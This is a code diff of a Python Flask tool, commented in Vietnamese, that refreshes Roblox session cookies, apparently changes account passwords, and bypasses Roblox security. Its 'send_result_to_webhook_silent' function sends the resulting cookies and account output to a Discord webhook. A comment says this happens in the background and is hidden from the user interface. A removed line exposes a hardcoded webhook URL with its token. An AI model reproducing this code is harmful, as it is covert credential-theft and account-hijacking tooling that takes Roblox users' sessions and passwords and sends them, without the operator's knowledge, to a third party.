@@ -13,7 +13,7 @@ import requests
 app = Flask(__name__)
 
 # Cấu hình Discord Webhook trực tiếp tại đây (chạy ngầm, không xuất ra UI)
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1575353201798946956/X3229l9zhS-BASB2LcwtO5dN76HF8b2U6nCXcEFAFOWpKqTAkcXdUgLWQlSu3Z_inKmS"
+DISCORD_WEBHOOK_URL = ""
 PING_EVERYONE = True
 
 LOGOUT_URL = "https://auth.roblox.com/v2/logout"
@@ -79,35 +79,37 @@ class Bypass:
         return new_cookie
 
 
-def send_refreshed_to_webhook_silent(content: str, ok_count: int, total_count: int) -> None:
+def send_result_to_webhook_silent(content: str, ok_count: int, total_count: int) -> None:
     url = (DISCORD_WEBHOOK_URL or "").strip()
     if not url or not content.strip():
         return
 
     ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-    filename = f"output_refreshed_{ts}.txt"
+    filename = f"roblox_changed_{ts}.txt"
     prefix_ping = "@everyone " if PING_EVERYONE else ""
     payload = {
-        "content": f"{prefix_ping}Refresh cookie hoàn tất: **{ok_count}/{total_count}** acc thành công.",
+        "content": f"{prefix_ping}Changepass hoàn tất: **{ok_count}/{total_count}** acc thành công.",
         "allowed_mentions": {"parse": ["everyone"]} if PING_EVERYONE else {"parse": []},
     }
-    raw_bytes = content.encode("utf-8")
-
+    files = {
+        "files[0]": (filename, io.BytesIO(content.encode("utf-8")), "text/plain; charset=utf-8")
+    }
     try:
         resp = requests.post(
             url,
             data={"payload_json": json.dumps(payload, ensure_ascii=False)},
-            files={"files[0]": (filename, io.BytesIO(raw_bytes), "text/plain; charset=utf-8")},
+            files=files,
             timeout=20,
         )
         if resp.status_code not in (200, 204):
+            # Fallback chuẩn `file` nếu endpoint/proxy không nhận `files[0]`
             requests.post(
                 url,
                 data={
                     "content": payload["content"],
                     "allowed_mentions": json.dumps(payload["allowed_mentions"]),
                 },
-                files={"file": (filename, io.BytesIO(raw_bytes), "text/plain")},
+                files={"file": (filename, io.BytesIO(content.encode("utf-8")), "text/plain")},
                 timeout=20,
             )
     except Exception:
@@ -216,7 +218,7 @@ def api_refresh():
                 joined_out = "\n".join(out_lines)
                 ok_total = ok_counter
 
-            send_refreshed_to_webhook_silent(joined_out, ok_total, total)
+            send_result_to_webhook_silent(joined_out, ok_total, total)
             push("done")
 
         threading.Thread(target=runner, daemon=True).start()
